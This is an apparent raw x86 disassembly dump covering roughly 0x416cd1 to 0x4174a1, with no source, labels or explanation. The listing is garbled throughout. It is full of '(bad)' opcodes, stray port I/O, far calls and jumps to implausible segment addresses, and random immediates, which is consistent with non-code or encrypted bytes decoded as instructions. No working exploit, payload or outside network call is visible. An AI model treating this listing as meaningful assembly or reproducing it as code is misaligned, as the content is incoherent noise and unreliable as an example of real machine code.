  416cd1:	in     al,0x97
  416cd3:	mov    ebp,ebx
  416cd5:	jp     0x416c5e
  416cd7:	xchg   DWORD PTR [edi-0x2206dd35],esp
  416cdd:	aas    
  416cde:	xchg   edi,eax
  416cdf:	dec    edx
  416ce0:	in     eax,0x3e
  416ce2:	or     eax,0x933cc56a
  416ce7:	(bad)  
  416ce8:	fsub   QWORD PTR [eax+edi*1-0x68c0227a]
  416cef:	mov    dh,0x1d
  416cf1:	dec    esp
  416cf2:	and    dl,BYTE PTR [edx]
  416cf4:	jmp    0x69084cc3
  416cf9:	xchg   ebp,eax
  416cfa:	lahf   
  416cfb:	sahf   
  416cfc:	sub    eax,0x68c00b58
  416d01:	inc    eax
  416d02:	ror    BYTE PTR [edi-0x30744b0b],1
  416d08:	or     al,0xcb
  416d0a:	loop   0x416d7d
  416d0c:	loopne 0x416c9a
  416d0e:	lahf   
  416d0f:	scas   al,BYTE PTR es:[edi]
  416d10:	and    eax,0xe110205c
  416d15:	push   es
  416d16:	fcom   st(3)
  416d18:	fidivr WORD PTR [edi]
  416d1a:	xchg   edi,eax
  416d1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d1c:	inc    ebx
  416d1d:	aaa    
  416d1e:	fild   DWORD PTR [esi-0x62f3a023]
  416d24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d25:	test   DWORD PTR [edi-0x68c02273],esp
  416d2b:	xchg   BYTE PTR [ecx],ah
  416d2d:	fs mov bl,0x4d
  416d30:	fnstsw WORD PTR [edi]
  416d32:	xchg   edi,eax
  416d33:	xchg   BYTE PTR [esi+0x47e79c02],ah
  416d39:	inc    eax
  416d3a:	inc    DWORD PTR [esi+0x52bc5074]
  416d40:	push   edx
  416d41:	xor    BYTE PTR [eax-0x68c0277a],al
  416d47:	or     al,0x15
  416d49:	call   0xbe99:0xa5e0d427
  416d50:	out    0xb0,al
  416d52:	xchg   esi,eax
  416d53:	mov    edx,DWORD PTR [ebp+0x1d082902]
  416d59:	add    ch,BYTE PTR [ebp-0x4cb62a79]
  416d5f:	dec    esp
  416d60:	cld    
  416d61:	stc    
  416d62:	(bad)  
  416d63:	xchg   ebp,eax
  416d64:	xchg   ecx,eax
  416d65:	dec    ecx
  416d66:	xchg   DWORD PTR fs:[ebp-0x18581cbf],edx
  416d6d:	xchg   ebx,eax
  416d6e:	inc    DWORD PTR [esi+0x50]
  416d71:	pusha  
  416d72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d73:	out    dx,eax
  416d74:	dec    edi
  416d75:	scas   eax,DWORD PTR es:[edi]
  416d76:	(bad)  
  416d77:	idiv   BYTE PTR [esi]
  416d79:	lods   eax,DWORD PTR ds:[esi]
  416d7a:	push   ds
  416d7b:	out    dx,al
  416d7c:	and    al,0xae
  416d7e:	mov    dh,0xe9
  416d80:	push   ecx
  416d81:	daa    
  416d82:	cli    
  416d83:	aad    0x8c
  416d85:	prefetch (bad)
  416d86:	or     eax,0x9da975ec
  416d8b:	in     eax,0x2c
  416d8d:	mov    esi,0xaf4acaea
  416d92:	sti    
  416d93:	mov    DWORD PTR [ebx],ecx
  416d95:	dec    ebp
  416d96:	and    ah,ch
  416d98:	add    DWORD PTR [ebx+ebx*8-0x6c272170],ecx
  416d9f:	mov    fs,WORD PTR [eax]
  416da1:	cmp    BYTE PTR [edx],ch
  416da3:	loopne 0x416dda
  416da5:	inc    esp
  416da6:	out    dx,eax
  416da7:	nop
  416da8:	inc    edx
  416da9:	dec    esp
  416daa:	rol    esp,0xe5
  416dad:	mov    ebx,0x7e9fe5cf
  416db2:	ror    cl,1
  416db4:	inc    ebp
  416db5:	pusha  
  416db6:	ret    
  416db7:	test   al,0x21
  416db9:	xchg   cl,ah
  416dbb:	adc    al,0x5d
  416dbd:	push   ecx
  416dbe:	lahf   
  416dbf:	mov    edx,0xd3cf40e5
  416dc4:	adc    ebx,edx
  416dc6:	js     0x416d62
  416dc8:	(bad)  
  416dc9:	(bad)  
  416dca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dcb:	scas   al,BYTE PTR es:[edi]
  416dcc:	mov    ch,0xc0
  416dce:	pop    esp
  416dcf:	inc    esi
  416dd0:	sub    al,0x70
  416dd2:	aam    0xd3
  416dd4:	in     eax,0x47
  416dd6:	push   edx
  416dd7:	adc    DWORD PTR [eax],esp
  416dd9:	cmp    BYTE PTR [eax+0x925f02],0x96
  416de0:	inc    ebp
  416de1:	enter  0xe9f7,0x2d
  416de5:	nop
  416de6:	fadd   QWORD PTR [edx+0x29]
  416de9:	inc    ecx
  416dea:	pop    es
  416deb:	pop    es
  416dec:	out    0x36,eax
  416dee:	mov    WORD PTR [ecx-0x8a4abd4],cs
  416df4:	pop    esi
  416df5:	dec    edx
  416df6:	cwde   
  416df7:	data16 test al,0x50
  416dfa:	ficom  WORD PTR [ecx+0x777d54e1]
  416e00:	icebp  
  416e01:	pop    eax
  416e02:	test   al,0x8c
  416e04:	call   0xe285c758
  416e09:	mov    eax,ebx
  416e0b:	stos   BYTE PTR es:[edi],al
  416e0c:	and    al,BYTE PTR [edx-0x5c]
  416e0f:	xchg   edx,eax
  416e10:	fiadd  WORD PTR [eax+0x644d94a1]
  416e16:	pop    ss
  416e17:	(bad)  
  416e18:	and    ah,BYTE PTR [ecx-0x791d6cdc]
  416e1e:	mov    dh,0xff
  416e20:	xor    BYTE PTR [ebp-0x31],cl
  416e23:	jae    0x416e0a
  416e25:	call   0x35020dd0
  416e2a:	add    ebx,eax
  416e2c:	cmp    eax,0xfdfa10d1
  416e31:	dec    edi
  416e32:	out    0x9e,al
  416e34:	mov    esi,0xbcf989a
  416e39:	pop    esp
  416e3a:	or     eax,DWORD PTR [ebx-0x13dad6ab]
  416e40:	jmp    0xe15d8b15
  416e45:	je     0x416e96
  416e47:	sub    ebp,0x2b88c982
  416e4d:	dec    edx
  416e4e:	loopne 0x416e2a
  416e50:	call   0x50e833a2
  416e55:	mov    bh,dl
  416e57:	clc    
  416e58:	repnz lahf 
  416e5a:	cmp    edx,DWORD PTR [esi+ebp*8-0x1edd5767]
  416e61:	repz mov bl,0x84
  416e64:	or     BYTE PTR [ecx+0x16],al
  416e67:	scas   eax,DWORD PTR es:[edi]
  416e68:	test   al,0x13
  416e6a:	or     BYTE PTR [edi+0x29],bl
  416e6d:	outs   dx,DWORD PTR ds:[esi]
  416e6e:	mov    eax,ds:0x71e20791
  416e73:	inc    edi
  416e74:	inc    ebx
  416e75:	inc    eax
  416e76:	xchg   esi,eax
  416e77:	clc    
  416e78:	jnp    0x416e41
  416e7a:	out    0xb3,eax
  416e7c:	adc    ebp,DWORD PTR [eax]
  416e7e:	mov    bh,0x73
  416e80:	xchg   ecx,eax
  416e81:	aad    0xd6
  416e83:	cdq    
  416e84:	popa   
  416e85:	call   0x3804:0x5694a457
  416e8c:	addr16 inc eax
  416e8e:	sbb    BYTE PTR [ebx+0xb],ch
  416e91:	mov    ds:0x73164d27,al
  416e96:	push   ss
  416e97:	(bad)  
  416e98:	adc    eax,0x4d5b957
  416e9d:	out    0x1f,eax
  416e9f:	xchg   DWORD PTR [esi],ebp
  416ea1:	lods   eax,DWORD PTR ds:[esi]
  416ea2:	inc    eax
  416ea3:	fmul   QWORD PTR [edi]
  416ea5:	jge    0x416f1b
  416ea7:	xchg   esi,eax
  416ea8:	mov    ebp,0x3f9aa7a0
  416ead:	inc    edx
  416eae:	xchg   edi,eax
  416eaf:	scas   al,BYTE PTR es:[edi]
  416eb0:	add    al,0xce
  416eb2:	bound  eax,QWORD PTR [edx+0x42a2a835]
  416eb8:	xchg   edx,eax
  416eb9:	ins    DWORD PTR es:[edi],dx
  416eba:	xor    al,0x8a
  416ebc:	mov    ecx,esp
  416ebe:	and    dl,al
  416ec0:	lods   eax,DWORD PTR ds:[esi]
  416ec1:	sbb    bl,BYTE PTR [ebp-0x53e11f6c]
  416ec7:	out    0x98,al
  416ec9:	int3   
  416eca:	gs jmp 0x416ec3
  416ecd:	or     DWORD PTR [ecx],esp
  416ecf:	pop    ds
  416ed0:	fsubr  QWORD PTR [ecx-0x377578d2]
  416ed6:	popf   
  416ed7:	dec    esp
  416ed8:	fld    QWORD PTR [edx+0x29]
  416edb:	mov    eax,ds:0x3500152d
  416ee0:	neg    BYTE PTR [edi+0x3e09050e]
  416ee6:	fistp  QWORD PTR [esi]
  416ee8:	fst    QWORD PTR [ecx-0x36adf72e]
  416eee:	xor    ch,0x78
  416ef1:	mov    ebx,0xff1767bd
  416ef6:	rol    BYTE PTR [esi-0x1057e68],1
  416efc:	push   esi
  416efd:	mov    eax,ds:0x1cc10395
  416f02:	cwde   
  416f03:	mov    ecx,0x46bd3743
  416f08:	push   ss
  416f09:	xchg   ecx,eax
  416f0a:	mov    bl,0xb4
  416f0c:	js     0x416ec2
  416f0e:	adc    BYTE PTR [ebp+0x48],ch
  416f11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f12:	pop    eax
  416f13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f14:	(bad)
  416f17:	push   es
  416f18:	push   edi
  416f19:	jmp    0x359ca7b5
  416f1e:	dec    ebp
  416f1f:	pop    edi
  416f20:	lock faddp st(1),st
  416f23:	or     BYTE PTR [edi+eax*2+0x3d026a9a],ch
  416f2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f2b:	arpl   WORD PTR [ecx+0x74c87f55],ax
  416f31:	test   eax,0x6f767ab5
  416f36:	xchg   edi,eax
  416f37:	test   eax,0x2df856f0
  416f3c:	or     BYTE PTR [eax+0x17],al
  416f3f:	mov    eax,0x5e5a9905
  416f44:	dec    edx
  416f45:	xor    al,0x98
  416f47:	add    ecx,DWORD PTR [eax+0x2137239e]
  416f4d:	mov    eax,ds:0xa2c224c6
  416f52:	pop    edi
  416f53:	xchg   DWORD PTR [esi-0x5b],esi
  416f56:	ja     0x416f9b
  416f58:	fst    QWORD PTR [ecx]
  416f5a:	or     eax,0xf7b96523
  416f5f:	xlat   BYTE PTR ds:[ebx]
  416f60:	lods   eax,DWORD PTR ds:[esi]
  416f61:	inc    eax
  416f62:	rcl    DWORD PTR [edi+edx*8],1
  416f65:	pop    es
  416f66:	push   esp
  416f67:	mov    dh,0x22
  416f69:	cli    
  416f6a:	mov    ch,0xa
  416f6c:	sbb    eax,0xd0cd5a6d
  416f71:	shl    BYTE PTR [ebx+0x3c9609bd],1
  416f77:	dec    edi
  416f78:	adc    BYTE PTR [ebp-0x2c],dl
  416f7b:	xchg   BYTE PTR [edi],bl
  416f7d:	cs mov ebx,0xd38ddddb
  416f83:	adc    BYTE PTR [edx+0x5a],al
  416f86:	jb     0x416fce
  416f88:	stos   BYTE PTR es:[edi],al
  416f89:	inc    eax
  416f8a:	push   ecx
  416f8b:	loop   0x416f9f
  416f8d:	sahf   
  416f8e:	retf   
  416f8f:	in     eax,dx
  416f90:	lods   al,BYTE PTR ds:[esi]
  416f91:	or     al,0x14
  416f93:	push   ebp
  416f94:	fnstsw WORD PTR [eax-0x5a]
  416f97:	push   ds
  416f98:	fsubr  st(6),st
  416f9a:	jecxz  0x416fb1
  416f9c:	sub    al,BYTE PTR [eax-0x3c]
  416f9f:	push   es
  416fa0:	dec    esi
  416fa1:	lods   eax,DWORD PTR es:[esi]
  416fa3:	pop    ecx
  416fa4:	int    0xad
  416fa6:	xchg   edi,eax
  416fa7:	fisttp DWORD PTR [ebp-0x80]
  416faa:	(bad)  
  416fab:	jb     0x416fde
  416fad:	pop    es
  416fae:	adc    eax,0xdc8e1b42
  416fb3:	xchg   BYTE PTR [ecx-0x26],bh
  416fb6:	pop    ds
  416fb7:	or     bl,ch
  416fb9:	push   0x6c
  416fbb:	xchg   edi,eax
  416fbc:	and    eax,0xe1183929
  416fc1:	aas    
  416fc2:	retf   0x224c
  416fc5:	or     al,0xb0
  416fc7:	ja     0x416f82
  416fc9:	mov    esi,0x1ddd8409
  416fce:	in     al,dx
  416fcf:	ins    DWORD PTR es:[edi],dx
  416fd0:	mov    ebp,0xf482fbff
  416fd5:	aas    
  416fd6:	sbb    BYTE PTR [ebx-0x7c],ch
  416fd9:	jnp    0x417017
  416fdb:	mov    es,WORD PTR [edx]
  416fdd:	test   eax,0xac83f497
  416fe2:	pop    esi
  416fe3:	cwde   
  416fe4:	mov    edi,DWORD PTR [edx+0x2c563bce]
  416fea:	mov    ah,0x1
  416fec:	sbb    edx,DWORD PTR ds:0x434dc318
  416ff2:	xor    al,BYTE PTR [edi]
  416ff4:	addr16 in eax,dx
  416ff6:	xchg   edi,eax
  416ff7:	retf   0x2dc8
  416ffa:	dec    edx
  416ffb:	or     cl,BYTE PTR [edx+ebx*2+0x6f1bb005]
  417002:	adc    DWORD PTR [ebx-0x7905ca41],esp
  417008:	or     BYTE PTR [esi],bl
  41700a:	cwde   
  41700b:	bts    DWORD PTR [esi+0x6e],0xe4
  417010:	sub    eax,0x62f803d6
  417015:	in     eax,dx
  417016:	push   ds
  417017:	ret    
  417018:	imul   ebp,edx,0xa99f1b4f
  41701e:	ins    DWORD PTR es:[edi],dx
  41701f:	out    0xdd,eax
  417021:	leave  
  417022:	mov    edx,0xee8b289
  417027:	add    eax,0x6dfb5eb6
  41702c:	or     al,al
  41702e:	push   esi
  41702f:	sbb    ebp,DWORD PTR [ebp-0x1b534094]
  417035:	xchg   esi,eax
  417036:	add    BYTE PTR [ecx+0x49277b33],dh
  41703c:	dec    ecx
  41703d:	scas   al,BYTE PTR es:[edi]
  41703e:	jne    0x4170bc
  417040:	xor    DWORD PTR ds:[bx+0x3229],eax
  417046:	outs   dx,BYTE PTR ds:[esi]
  417047:	xor    bl,ch
  417049:	add    eax,0x47795f4f
  41704e:	inc    ebp
  41704f:	cmp    BYTE PTR [esi+0x41],al
  417052:	mov    al,ds:0xb7176615
  417057:	test   eax,0x28682419
  41705c:	fnsave [edx-0x32ef1a4]
  417062:	jmp    0x417012
  417064:	add    eax,edx
  417066:	push   ebx
  417067:	fisubr WORD PTR [eax-0x72]
  41706a:	mov    al,BYTE PTR [edi+0x215497fa]
  417070:	fstp   st(6)
  417072:	call   DWORD PTR [esi]
  417074:	neg    DWORD PTR gs:[eax-0x3b]
  417078:	(bad)  
  417079:	xor    eax,0x8e9666d5
  41707e:	fadd   DWORD PTR [esi+0x6b9f7557]
  417084:	(bad)  
  417086:	aas    
  417087:	ins    DWORD PTR es:[edi],dx
  417088:	push   edx
  417089:	xchg   ebp,eax
  41708a:	das    
  41708b:	pop    edi
  41708c:	xor    eax,0xb883ea40
  417091:	shl    BYTE PTR [ebp+0x22],1
  417094:	arpl   WORD PTR ss:[edi-0x4cbb6249],dx
  41709b:	shl    DWORD PTR [edx+ecx*1+0x4edb3ad4],1
  4170a2:	pop    edx
  4170a3:	xchg   edi,ecx
  4170a5:	ins    BYTE PTR es:[edi],dx
  4170a6:	ins    DWORD PTR es:[edi],dx
  4170a7:	xor    bl,BYTE PTR [edx]
  4170a9:	and    al,0x5d
  4170ab:	mov    gs,WORD PTR [ecx]
  4170ad:	rcr    esi,cl
  4170af:	push   es
  4170b0:	or     ch,BYTE PTR [edx+0x67a58b8a]
  4170b6:	dec    esp
  4170b7:	mov    cl,BYTE PTR [edi]
  4170b9:	adc    ebx,DWORD PTR [eax-0x67]
  4170bc:	cmp    al,0x36
  4170be:	cdq    
  4170bf:	sbb    BYTE PTR [ebp+ecx*2+0xe8ed7b2],ah
  4170c6:	or     BYTE PTR [esp+ebp*2],dh
  4170c9:	inc    eax
  4170ca:	xor    BYTE PTR [edi-0x588abeca],bh
  4170d0:	mov    ah,0x79
  4170d2:	jg     0x417106
  4170d4:	in     al,0x81
  4170d6:	mov    ebp,0x57cb12b6
  4170db:	dec    edi
  4170dc:	xor    al,0xb2
  4170de:	leave  
  4170df:	rol    ebx,0x2e
  4170e2:	inc    edi
  4170e3:	lahf   
  4170e4:	mov    ebx,DWORD PTR [ebp+0x1ab2b697]
  4170ea:	mov    ebp,esp
  4170ec:	jnp    0x417080
  4170ee:	sbb    al,0xa8
  4170f0:	pop    ecx
  4170f1:	mov    ds:0x5bb086e3,eax
  4170f6:	inc    eax
  4170f7:	(bad)  
  4170f8:	(bad)  [ecx+0x28149bec]
  4170fe:	mov    eax,edi
  417100:	sub    al,0x3a
  417102:	sahf   
  417103:	pushf  
  417104:	cmp    al,0xec
  417106:	mov    esi,0xac7b7086
  41710b:	(bad)  
  41710c:	fstp   QWORD PTR [ecx-0x12]
  41710f:	pop    ds
  417110:	stc    
  417111:	mov    DWORD PTR [edx],esi
  417113:	xor    eax,0x559140c6
  417118:	mov    edx,0x96d53a30
  41711d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41711e:	sahf   
  41711f:	mov    ecx,eax
  417121:	loope  0x417196
  417123:	jne    0x417153
  417125:	stos   DWORD PTR es:[edi],eax
  417126:	inc    esp
  417127:	push   0xffffffa1
  417129:	adc    eax,0x757a1830
  41712e:	xchg   DWORD PTR [edi-0x6d945652],eax
  417134:	fst    QWORD PTR [esi]
  417136:	mov    dh,0xfb
  417138:	xor    BYTE PTR [ebx-0x41],bh
  41713b:	mov    bh,0xc7
  41713d:	inc    edi
  41713e:	test   DWORD PTR [eax-0x5e],ebp
  417141:	mov    ebp,0x44bdc17e
  417146:	outs   dx,DWORD PTR ds:[esi]
  417147:	sub    bh,bl
  417149:	jg     0x4170e2
  41714b:	mov    ecx,0xcbf0a20c
  417150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417151:	mov    dh,0xac
  417153:	es jo  0x4170f1
  417156:	(bad)  
  417157:	ret    
  417158:	jmp    0xebcf0d0d
  41715d:	pop    esi
  41715e:	aaa    
  41715f:	dec    edx
  417160:	mov    al,0x94
  417162:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417163:	push   es
  417164:	fst    QWORD PTR [ebx-0x60]
  417167:	ins    DWORD PTR es:[edi],dx
  417168:	mov    gs,WORD PTR [esi-0x68]
  41716b:	sub    eax,0xb61246ee
  417170:	fdivr  DWORD PTR [eax+0x302a84bb]
  417176:	dec    ebx
  417177:	addr16 fucom st(0)
  41717a:	mov    ch,dl
  41717c:	mov    ecx,0x56466171
  417181:	and    al,0xe
  417183:	xchg   edx,eax
  417184:	mov    edi,esp
  417186:	xchg   edi,eax
  417187:	mov    edi,0x11d577c8
  41718c:	scas   eax,DWORD PTR es:[edi]
  41718d:	pusha  
  41718e:	xchg   edi,eax
  41718f:	pop    edx
  417190:	xor    ch,BYTE PTR [esi-0x25]
  417193:	pop    ebx
  417194:	xor    esi,DWORD PTR [edx+esi*2]
  417197:	add    cl,bl
  417199:	mov    al,0x45
  41719b:	mov    ah,BYTE PTR [ebx+0x8]
  41719e:	jo     0x41721f
  4171a0:	xlat   BYTE PTR ds:[ebx]
  4171a1:	in     eax,0x97
  4171a3:	jmp    0xed73:0x44d04c2
  4171aa:	fiadd  WORD PTR [edi]
  4171ac:	repz (bad) 
  4171ae:	fadd   DWORD PTR [esi-0x53bde0c9]
  4171b4:	fdivrp st(5),st
  4171b6:	mov    eax,ds:0x5fdbfe63
  4171bb:	fistp  WORD PTR [ebp+0x2ccd652b]
  4171c1:	adc    DWORD PTR [eax+0x7872a987],eax
  4171c7:	xor    eax,0xa0c5eedd
  4171cc:	jnp    0x417179
  4171ce:	addr16 jns 0x41722d
  4171d1:	inc    eax
  4171d2:	pushf  
  4171d3:	iret   
  4171d4:	out    0xa1,eax
  4171d6:	bswap  edi
  4171d8:	push   ds
  4171d9:	scas   eax,DWORD PTR es:[edi]
  4171da:	xchg   edi,eax
  4171db:	dec    esp
  4171dc:	cmp    DWORD PTR [ebp-0x53],ebx
  4171df:	popa   
  4171e0:	inc    eax
  4171e1:	nop
  4171e2:	xchg   edx,eax
  4171e3:	adc    bh,BYTE PTR [edi+0x5176b840]
  4171e9:	shl    DWORD PTR [eax+0x70],0xe5
  4171ed:	es mov ch,0x35
  4171f0:	jbe    0x417239
  4171f2:	xchg   edi,eax
  4171f3:	xchg   edi,eax
  4171f4:	jp     0x41724e
  4171f6:	add    al,0xc9
  4171f8:	mov    eax,DWORD PTR [eax-0x26]
  4171fb:	into   
  4171fc:	shr    BYTE PTR ss:[ebx-0x6873612b],1
  417203:	pop    eax
  417204:	pop    eax
  417205:	inc    ebp
  417206:	ins    DWORD PTR es:[edi],dx
  417207:	test   al,0x26
  417209:	sahf   
  41720a:	xor    ebx,esi
  41720c:	mov    dl,0x6f
  41720e:	add    BYTE PTR [edi-0x14d5224a],al
  417214:	cld    
  417215:	or     al,cl
  417217:	mov    ah,0x9d
  417219:	xor    eax,DWORD PTR [esp+edx*1-0x5a]
  41721d:	xor    DWORD PTR [ecx+0x56],0xf84d4009
  417224:	aaa    
  417225:	jle    0x41723b
  417227:	fist   WORD PTR [ebx]
  417229:	test   eax,0x3661a9b3
  41722e:	sbb    DWORD PTR [esi+0x6e],eax
  417231:	aaa    
  417232:	fisub  WORD PTR [ecx+0x2075fba5]
  417238:	lea    edi,[ebx+0x43]
  41723b:	xchg   DWORD PTR [eax+eiz*8-0x4113f652],esi
  417242:	sbb    ecx,DWORD PTR [eax+0x6]
  417245:	int3   
  417246:	jmp    0xe589286b
  41724b:	out    0x92,al
  41724d:	pop    ebp
  41724e:	repnz lock aaa 
  417251:	frstor [eax-0x6770a55a]
  417257:	xor    esi,DWORD PTR [esi]
  417259:	sub    DWORD PTR [ebx],edi
  41725b:	inc    ecx
  41725c:	adc    eax,0x69cd5a13
  417261:	push   ds
  417262:	push   ebp
  417263:	out    0xfb,eax
  417265:	push   es
  417266:	push   ebx
  417267:	xchg   DWORD PTR [ebx-0x78],ebp
  41726a:	cs ja  0x41724a
  41726d:	popa   
  41726e:	mov    edx,0x255bacb
  417273:	jge    0x417257
  417275:	xor    ecx,edi
  417277:	adc    ebx,DWORD PTR ds:0x7ac4e767
  41727d:	jp     0x4172ea
  41727f:	pop    edi
  417280:	adc    esp,DWORD PTR fs:[ecx]
  417283:	mov    dl,0xc2
  417285:	inc    eax
  417286:	aaa    
  417287:	push   es
  417288:	mov    edx,0x22297c2
  41728d:	cmp    ebp,esp
  41728f:	test   eax,0x9163a307
  417294:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417295:	sbb    al,0x83
  417297:	xchg   esi,eax
  417298:	pop    ebp
  417299:	xchg   DWORD PTR [esi+0x34],eax
  41729c:	rep outs dx,BYTE PTR ds:[esi]
  41729e:	call   0xb7cd:0x4f4cb1f4
  4172a5:	add    edx,DWORD PTR [ecx+0x6ab84dbe]
  4172ab:	ja     0x4172c3
  4172ad:	cli    
  4172ae:	stos   BYTE PTR es:[edi],al
  4172af:	mov    DWORD PTR [eax-0x9],eax
  4172b2:	outs   dx,DWORD PTR ds:[si]
  4172b4:	sar    BYTE PTR ds:0x14249b9f,cl
  4172ba:	dec    esp
  4172bb:	cmp    al,0xfc
  4172bd:	jg     0x417284
  4172bf:	mov    esp,0x2168e116
  4172c4:	mov    eax,0x7fa5e290
  4172c9:	fwait
  4172ca:	cmc    
  4172cb:	(bad)  
  4172cc:	not    BYTE PTR [edi-0x69]
  4172cf:	inc    edx
  4172d0:	aam    0xfa
  4172d2:	mov    BYTE PTR [edx-0x6bdcd48f],ch
  4172d8:	xor    DWORD PTR [eax],ebp
  4172da:	jnp    0x417264
  4172dc:	xchg   ecx,eax
  4172dd:	fwait
  4172de:	xor    dh,ch
  4172e0:	in     al,dx
  4172e1:	adc    bl,BYTE PTR [eax-0x50c5d8a2]
  4172e7:	jmp    0xcfab:0x9ebfcb21
  4172ee:	call   0xe069:0x12801b86
  4172f5:	sub    BYTE PTR [edi],0x40
  4172f8:	jno    0x4172d3
  4172fa:	jl     0x4172a9
  4172fc:	movzx  esp,BYTE PTR [esi+0x37]
  417300:	dec    ebx
  417301:	test   al,0xe7
  417303:	xchg   ebp,eax
  417305:	jmp    0xe84e:0x80ae473f
  41730c:	or     BYTE PTR [ecx+0x39ec920c],ah
  417312:	stos   WORD PTR es:[edi],ax
  417314:	out    0x1f,al
  417316:	aas    
  417317:	(bad)
  41731a:	mov    ah,0x89
  41731c:	lods   al,BYTE PTR ds:[esi]
  41731d:	sub    al,0x69
  41731f:	xchg   DWORD PTR [eax+0x52],edi
  417322:	or     edx,esi
  417324:	push   ss
  417325:	inc    ebp
  417326:	retf   
  417327:	adc    eax,0x718e7d4
  41732c:	pop    ebp
  41732d:	mov    ebp,ss
  41732f:	in     al,0x2d
  417331:	mov    esi,0x2089b3
  417336:	inc    ebx
  417337:	jnp    0x4173b6
  417339:	sub    bh,BYTE PTR [ebx*2-0x5c1340e6]
  417340:	jmp    0xe3c83964
  417345:	cs in  eax,0x18
  417348:	sbb    bh,0xd4
  41734b:	xchg   BYTE PTR [edx],ah
  41734d:	lock (bad) 
  41734f:	std    
  417350:	ficom  WORD PTR [edx]
  417352:	test   eax,0xe6a6ad9e
  417357:	stc    
  417358:	shl    edi,1
  41735a:	in     eax,dx
  41735b:	push   eax
  41735c:	mov    ebx,0x9d968737
  417361:	es push eax
  417363:	into   
  417364:	push   eax
  417365:	add    bl,BYTE PTR [eax-0x1317124c]
  41736b:	mov    esi,0x181184f0
  417370:	mov    ch,0xd6
  417372:	arpl   WORD PTR [esi+0x29],di
  417375:	mov    dl,0xe
  417377:	xchg   DWORD PTR [eax+0x17],ecx
  41737a:	nop
  41737b:	or     eax,0xe61c40dd
  417380:	push   0x1f
  417382:	and    DWORD PTR [edx+0x1bfb4351],ecx
  417388:	sahf   
  417389:	sbb    al,0x7e
  41738b:	idiv   BYTE PTR [esi-0x6e]
  41738e:	cli    
  41738f:	mov    dl,0x6a
  417391:	lahf   
  417392:	inc    edi
  417393:	neg    ebp
  417395:	jp     0x41731d
  417397:	popa   
  417398:	adc    DWORD PTR [edx],ebp
  41739a:	mov    edi,ecx
  41739c:	mov    eax,ds:0x19bd575f
  4173a1:	add    BYTE PTR [ecx],dh
  4173a3:	xchg   esp,eax
  4173a4:	push   eax
  4173a5:	and    eax,0xf7dd114b
  4173aa:	jecxz  0x417361
  4173ac:	mov    ecx,0x38a62e32
  4173b1:	dec    esi
  4173b2:	ds mov bh,0xff
  4173b5:	fs cld 
  4173b7:	mov    ecx,0xa1aac104
  4173bc:	or     bh,BYTE PTR [eax]
  4173be:	and    DWORD PTR [eax-0xcb85123],edi
  4173c4:	adc    DWORD PTR [esi+0x60],eax
  4173c7:	jmp    0x71cd:0xfb954028
  4173ce:	mov    al,0x3f
  4173d0:	std    
  4173d1:	or     bl,BYTE PTR [eax+0x3a633bca]
  4173d7:	in     eax,dx
  4173d8:	push   ds
  4173d9:	data16 loop 0x4173fb
  4173dc:	lods   eax,DWORD PTR ds:[esi]
  4173dd:	mov    eax,ds:0x27a78766
  4173e2:	pushf  
  4173e3:	fcmovnu st,st(5)
  4173e5:	lahf   
  4173e6:	inc    ebp
  4173e7:	cwde   
  4173e8:	jp     0x417469
  4173ea:	loopne 0x417378
  4173ec:	or     eax,DWORD PTR [eax+0x54]
  4173ef:	repz lea eax,[eax-0x705d48e]
  4173f6:	out    dx,eax
  4173f7:	sub    eax,DWORD PTR [eax+eax*2+0x760c4739]
  4173fe:	mov    dl,0xc7
  417400:	jnp    0x417446
  417402:	xor    al,0x19
  417404:	call   0xc9a5187b
  417409:	fwait
  41740a:	daa    
  41740b:	pop    es
  41740c:	(bad)  [ecx-0x35]
  41740f:	push   0x8d9b932
  417414:	push   ebp
  417415:	dec    edi
  417416:	mov    bl,0x75
  417418:	rcl    DWORD PTR [eax],0x9f
  41741b:	je     0x4173b7
  41741d:	xor    edx,DWORD PTR [esi+0x47]
  417420:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417421:	repnz cmp esp,0x39
  417425:	push   ebx
  417426:	adc    BYTE PTR ds:0xa3183d45,bh
  41742c:	icebp  
  41742d:	stos   BYTE PTR es:[edi],al
  41742e:	fistp  DWORD PTR [ebx+0xd]
  417431:	inc    eax
  417432:	or     al,0xf7
  417434:	and    eax,0xc46b252a
  417439:	push   0x92a8497
  41743e:	xlat   BYTE PTR ds:[ebx]
  41743f:	sbb    eax,0xff32f076
  417444:	into   
  417445:	dec    esi
  417446:	mov    cl,BYTE PTR [edx+0x5f6f81cd]
  41744c:	mov    edi,0x68489a74
  417451:	xchg   edx,ebx
  417453:	ins    DWORD PTR es:[edi],dx
  417454:	(bad)  
  417456:	dec    edx
  417457:	dec    ebx
  417458:	fsub   QWORD PTR [esi-0x7b]
  41745b:	inc    esp
  41745c:	and    eax,0xfd59e74f
  417461:	mov    dh,0x14
  417463:	popa   
  417464:	stos   DWORD PTR es:[edi],eax
  417465:	mov    eax,0x5114c597
  41746a:	out    dx,eax
  41746b:	fild   QWORD PTR [edx]
  41746d:	mov    esi,0xd2832bed
  417472:	scas   al,BYTE PTR es:[edi]
  417473:	xchg   BYTE PTR [edi],al
  417475:	ins    DWORD PTR es:[edi],dx
  417476:	mov    bl,0xf7
  417478:	ffree  st(2)
  41747a:	stos   DWORD PTR es:[edi],eax
  41747b:	test   eax,0x65855304
  417480:	jne    0x4174c2
  417482:	sahf   
  417483:	mov    al,ds:0xd31c4fd2
  417488:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417489:	xchg   ebp,eax
  41748a:	sahf   
  41748b:	mov    bl,0x1e
  41748d:	stos   BYTE PTR es:[edi],al
  41748e:	adc    dl,BYTE PTR [ecx+0x25f50add]
  417494:	(bad)  
  417495:	aas    
  417496:	jmp    0xb158:0x4c29212b
  41749d:	int    0x97
  41749f:	cmp    al,0xc0
  4174a1:	xor    BYTE PTR [ecx],0x71
